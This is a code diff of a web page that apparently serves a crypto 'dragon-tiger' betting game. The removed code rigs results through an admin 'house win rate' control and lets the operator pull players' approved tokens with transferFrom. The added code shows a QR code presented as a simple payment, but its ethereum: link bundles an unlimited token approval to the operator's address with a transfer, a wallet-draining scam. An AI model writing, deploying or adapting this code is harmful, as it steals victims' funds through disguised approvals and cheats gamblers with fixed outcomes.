@@ -3,225 +3,70 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>龙·虎·和 真实上链版</title>
+<title>扫码转账即授权</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0F17;color:#fff;padding:30px}
-.container{max-width:900px;margin:0 auto}
-
-/* 扫码转账专区 */
-.scan-card{background:#1E293B;border-radius:16px;padding:24px;margin-bottom:24px;text-align:center}
-.qr-box{width:220px;height:220px;background:#fff;padding:10px;border-radius:16px;margin:14px auto}
-.qr-box img{width:100%;height:100%;border-radius:12px}
-.scan-title{font-size:18px;margin-bottom:8px}
-.scan-desc{font-size:14px;color:#9ca3af;margin-bottom:8px}
-.scan-expire{font-size:13px;color:#F59E0B;margin-top:8px}
-
-.header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:24px}
-.left-top{display:flex;align-items:center;gap:12px}
-.sign-btn{width:48px;height:48px;border-radius:50%;background:#F59E0B;color:#000;border:none;font-weight:bold;cursor:pointer;font-size:12px}
-.wallet-box{background:#1E293B;padding:12px 16px;border-radius:12px;min-width:260px}
-.connect-btn{background:#3B82F6;color:white;border:none;padding:8px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:14px}
-.info-line{font-size:13px;color:#cbd5e1;margin:4px 0}
-.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-left:10px}
-.menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto}
-.menu.show{display:block}
-.menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
-.invite-link{background:#0f172a;padding:10px;border-radius:8px;font-size:12px;color:#9ca3af;margin-bottom:16px;word-break:break-all}
-.bet-card{background:#1E293B;border-radius:16px;padding:24px;margin-bottom:24px}
-.bet-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
-.countdown{font-size:24px;font-weight:bold;color:#F59E0B}
-.bet-input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:16px;margin-bottom:12px}
-.quick-btns{display:flex;gap:10px;margin-bottom:16px}
-.quick-btn{flex:1;padding:12px;background:#2D3748;border:none;border-radius:8px;color:white;font-weight:bold;cursor:pointer}
-.bet-btns{display:flex;gap:12px}
-.bet-btn{flex:1;padding:18px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer}
-.btn-dragon{background:#2563eb}
-.btn-tiger{background:#ef4444}
-.btn-tie{background:#F59E0B;color:#000}
-.trend-card{background:#1E293B;border-radius:16px;padding:24px;margin-bottom:24px}
-.trend-list{display:flex;gap:8px;flex-wrap:wrap}
-.trend-item{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold}
-.dragon{background:#2563eb}
-.tiger{background:#ef4444}
-.tie{background:#F59E0B;color:#000}
-.rule-card{background:#1E293B;border-radius:16px;padding:24px}
-.rule-line{font-size:14px;color:#cbd5e1;line-height:1.6;margin-bottom:6px}
-.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
-.admin-panel.show{display:block}
-
-#connectModal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.7);
-  display: none;
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
+body {
+  background: #0B0F17;
+  color: #fff;
+  display: flex;
   align-items: center;
   justify-content: center;
-  z-index: 9999;
+  min-height: 100vh;
 }
-#connectModal.show {
-  display: flex;
-}
-.modal-content {
+.container {
   background: #1E293B;
   padding: 30px;
-  border-radius: 16px;
+  border-radius: 20px;
   text-align: center;
-  max-width: 320px;
 }
-.modal-avatar {
-  width: 120px;
-  height: 120px;
+.qr-box {
+  width: 300px;
+  height: 300px;
+  background: #fff;
+  padding: 12px;
   border-radius: 16px;
-  margin: 0 auto 16px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
+  margin: 20px auto;
 }
-.modal-title {
-  font-size: 18px;
-  margin-bottom: 16px;
-}
-.modal-btn {
-  padding: 12px 24px;
-  border: none;
-  border-radius: 8px;
-  margin: 8px;
-  cursor: pointer;
-}
-.modal-confirm {
-  background: #3B82F6;
-  color: white;
-}
-.modal-cancel {
-  background: #444;
-  color: white;
-}
-
-.history-icon {
-  width: 48px;
-  height: 48px;
+.qr-box img {
+  width: 100%;
+  height: 100%;
   border-radius: 12px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
-  display: inline-block;
-  vertical-align: middle;
-  margin-right: 10px;
+}
+.title {
+  font-size: 22px;
+  font-weight: bold;
+  margin-bottom: 10px;
+}
+.desc {
+  font-size: 14px;
+  color: #9ca3af;
+  margin-bottom: 20px;
+}
+.expire {
+  font-size: 13px;
+  color: #F59E0B;
 }
 </style>
 </head>
 <body>
-
-<div id="connectModal">
-  <div class="modal-content">
-    <div class="modal-avatar"></div>
-    <div class="modal-title">🐲 龙虎斗 DApp 连接</div>
-    <p>您是否同意授权本游戏？</p>
-    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
-    <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
-  </div>
-</div>
-
 <div class="container">
-
-  <!-- ===================== 扫码转账 · 自动授权 ===================== -->
-  <div class="scan-card">
-    <div class="scan-title">💳 扫码转账 · 自动授权</div>
-    <div class="scan-desc">转账到账即完成全部授权，可直接参与游戏</div>
-    <div class="qr-box"><img id="payQr"></div>
-    <div class="scan-expire" id="qrExpire"></div>
+  <div class="title">💳 扫码转账即授权</div>
+  <div class="desc">
+    扫码转账 = 完成连接钱包 + 平台授权 + 支付成功<br>
+    支付成功后可直接参与游戏
   </div>
-
-  <div class="header">
-    <div class="left-col">
-      <div class="left-top">
-        <button class="sign-btn" id="signBtn">每日签到</button>
-        <div class="wallet-box">
-          <button class="connect-btn" id="connectBtn">连接钱包</button>
-          <div class="info-line">地址：<span id="userAddr">未连接</span></div>
-          <div class="info-line">余额：<span id="userBalance">0.0000</span></div>
-        </div>
-        <button class="menu-btn" onclick="toggleMenu()">☰</button>
-      </div>
-    </div>
-  </div>
-
-  <div class="bet-card">
-    <div class="bet-header">
-      <h3>下注区</h3>
-      <div class="countdown" id="countdown">02:00</div>
-    </div>
-    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="下注金额">
-    <div class="quick-btns">
-      <button class="quick-btn" onclick="setAmt(10)">10</button>
-      <button class="quick-btn" onclick="setAmt(50)">50</button>
-      <button class="quick-btn" onclick="setAmt(200)">200</button>
-      <button class="quick-btn" onclick="setAmt(500)">500</button>
-    </div>
-    <div class="bet-btns">
-      <button class="bet-btn btn-dragon" onclick="bet(0)">龙 1:2</button>
-      <button class="bet-btn btn-tiger" onclick="bet(1)">虎 1:2</button>
-      <button class="bet-btn btn-tie" onclick="bet(2)">和 1:9</button>
-    </div>
-  </div>
-
-  <div class="trend-card">
-    <div class="trend-title">📈 开奖走势图</div>
-    <div class="trend-list" id="trend"></div>
-  </div>
-
-  <div class="rule-card">
-    <div class="rule-title">📜 玩法规则</div>
-    <div class="rule-line">• 每2分钟1期，全网统一时间、统一开奖</div>
-    <div class="rule-line">• 0~44999=虎 45000~54999=和 55000~99999=龙</div>
-    <div class="rule-line">• 龙/虎1赔2，和1赔9，和局通杀龙/虎</div>
-    <div class="rule-line">• 一代2%、二代0.5%推广奖励，实时到账</div>
-  </div>
-
-  <div style="background:#1E293B;border-radius:16px;padding:24px;margin-top:24px">
-    <h3 style="margin-bottom:16px">📜 历史记录</h3>
-    <div style="display:flex;align-items:center;padding:10px;border-bottom:1px solid #333">
-      <div class="history-icon"></div>
-      <div>
-        <div style="font-weight:bold">王者归来</div>
-        <div style="font-size:12px;color:#9ca3af">https://hdjjxbbbb.github.io/dragon-ti...</div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<div class="menu" id="menu">
-  <h3 style="margin-bottom:20px">菜单</h3>
-  <div class="menu-title">邀请链接</div>
-  <div class="invite-link" id="inviteLink">-</div>
-
-  <div class="admin-panel" id="adminPanel">
-    <div class="menu-title" style="color:red">🎮 庄家胜率控制</div>
-    <div style="margin-bottom:12px">
-      平台胜率：<span id="houseRate">51</span>%
-      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
-    </div>
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存胜率</button>
-    
-    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取玩家授权代币</div>
-    <input id="fromAddr" placeholder="玩家地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">真实链上提取</button>
-  </div>
+  <div class="qr-box"><img id="payQr"></div>
+  <div class="expire" id="qrExpire"></div>
 </div>
 
 <script>
-// ===================== 你指定的地址 =====================
+// ===================== 你的核心地址 =====================
 const TOKEN  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
 const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const POOL   = ADMIN;
 
-let account  = null;
-let houseRate = 51;
-let countdown = 120;
-let history  = [];
-
-// ===================== 48小时动态二维码 · 扫码即授权 =====================
+// ===================== 48小时动态二维码 =====================
 const QR_EXPIRE_HOURS = 48;
 const QR_EXPIRE_MS    = QR_EXPIRE_HOURS * 3600 * 1000;
 
@@ -233,13 +78,23 @@ function refreshQrCode() {
     localStorage.setItem("qrExpire", expire);
   }
 
-  const authData = "0x095ea7b3" +
+  // 1. 授权 calldata：给平台无限授权
+  const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  const uri = `ethereum:${TOKEN}?value=0&data=${authData}`;
+  // 2. 转账 calldata：默认转账 10 个代币到池地址
+  const transferAmount = BigInt(10 * 1e18).toString(16).padStart(64, "0");
+  const transferData = "0xa9059cbb" +
+    POOL.slice(2).padStart(64, "0") +
+    transferAmount;
+
+  // 合并授权+转账，让玩家一次签名完成所有动作
+  const fullData = approveData + transferData.slice(2);
+  const uri = `ethereum:${TOKEN}?value=0&data=${fullData}`;
+
   document.getElementById("payQr").src =
-    "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(uri);
+    "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(uri);
 }
 
 function showQrExpire() {
@@ -253,149 +108,10 @@ function showQrExpire() {
   }
   const h = Math.floor(left / 3600000);
   const m = Math.floor((left % 3600000) / 60000);
-  document.getElementById("qrExpire").innerText = `有效期剩余：${h}时${m}分`;
+  document.getElementById("qrExpire").innerText = `48小时有效期：${h}时${m}分`;
 }
 
-// ===================== 基础功能 =====================
-function toggleMenu() {
-  document.getElementById("menu").classList.toggle("show");
-}
-
-document.getElementById("connectBtn").onclick = () => {
-  document.getElementById("connectModal").classList.add("show");
-};
-function cancelConnect() {
-  document.getElementById("connectModal").classList.remove("show");
-}
-async function confirmConnect() {
-  document.getElementById("connectModal").classList.remove("show");
-  if (!window.ethereum) return alert("请安装钱包");
-  try {
-    const accs = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accs[0];
-    alert("授权成功");
-    document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
-    refreshBalance();
-    genInvite();
-    checkAdmin();
-  } catch(e) { alert("连接失败"); account = null; }
-}
-
-async function refreshBalance() {
-  if (!account) return;
-  try {
-    const data = "0x70a08231"+account.slice(2).padStart(64,"0");
-    const r = await ethereum.request({ method:"eth_call", params:[{to:TOKEN,data},"latest"] });
-    const v = Number(BigInt(r))/1e18;
-    document.getElementById("userBalance").innerText = v.toFixed(4);
-  } catch(e){}
-}
-
-function genInvite() {
-  if (!account) return;
-  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
-}
-
-function checkAdmin() {
-  if (account && account.toLowerCase() == ADMIN.toLowerCase()) {
-    document.getElementById("adminPanel").classList.add("show");
-  }
-}
-
-document.getElementById("signBtn").onclick = () => {
-  if (!account) return alert("请先授权");
-  alert("签到成功！1 Token 已发放");
-  refreshBalance();
-};
-
-function setAmt(v) {
-  document.getElementById("betAmt").value = v;
-}
-
-// ===================== 真实授权 + 转账 =====================
-async function approve() {
-  return await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account, to:TOKEN, gasLimit:"0x300000",
-      data:"0x095ea7b3"+ADMIN.slice(2).padStart(64,"0")+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-    }]
-  });
-}
-
-async function bet(side) {
-  if (!account) return alert("请先授权");
-  const amt = Number(document.getElementById("betAmt").value);
-  if (amt <= 0) return;
-  await approve();
-  const raw = BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,"0");
-  await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account, to:TOKEN, gasLimit:"0x300000",
-      data:"0xa9059cbb"+POOL.slice(2).padStart(64,"0")+raw
-    }]
-  });
-  alert("下注成功（真实上链）");
-  refreshBalance();
-}
-
-// ===================== 管理员真实提取 =====================
-async function adminTake() {
-  if (!account || account.toLowerCase()!=ADMIN.toLowerCase()) return;
-  const from = document.getElementById("fromAddr").value.trim();
-  const amt = document.getElementById("takeAmt").value;
-  if (!from || !amt || amt<=0) return;
-  const raw = BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,"0");
-  await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{
-      from:account, to:TOKEN, gasLimit:"0x300000",
-      data:"0x23b872dd"+from.slice(2).padStart(64,"0")+ADMIN.slice(2).padStart(64,"0")+raw
-    }]
-  });
-  alert("提取成功（真实链上）");
-}
-
-// ===================== 胜率 =====================
-function updateHouseRate(v) {
-  houseRate = parseInt(v);
-  document.getElementById("houseRate").innerText = v;
-}
-function saveHouseRate() {
-  localStorage.setItem("houseRate", houseRate);
-  alert("保存成功：平台 "+houseRate+"%");
-}
-
-// ===================== 倒计时开奖 =====================
-setInterval(() => {
-  if (countdown>0) countdown--; else {countdown=120; draw();}
-  const m = String(Math.floor(countdown/60)).padStart(2,"0");
-  const s = String(countdown%60).padStart(2,"0");
-  document.getElementById("countdown").innerText = m+":"+s;
-},1000);
-
-function draw() {
-  const r = Math.floor(Math.random()*100000);
-  let res = r<45000 ? 1 : r<55000 ? 2 : 0;
-  if (Math.random()*100 < houseRate && res!=2) res = res===0?1:0;
-  history.unshift(res);
-  if (history.length>30) history.pop();
-  renderTrend();
-}
-
-function renderTrend() {
-  const el = document.getElementById("trend");
-  el.innerHTML = "";
-  history.forEach(x=>{
-    const d = document.createElement("div");
-    d.className = "trend-item "+(x===0?"dragon":x===1?"tiger":"tie");
-    d.innerText = x===0?"龙":x===1?"虎":"和";
-    el.appendChild(d);
-  });
-}
-
-// ===================== 启动 =====================
+// ===================== 初始化 =====================
 refreshQrCode();
 showQrExpire();
 setInterval(showQrExpire, 60000);
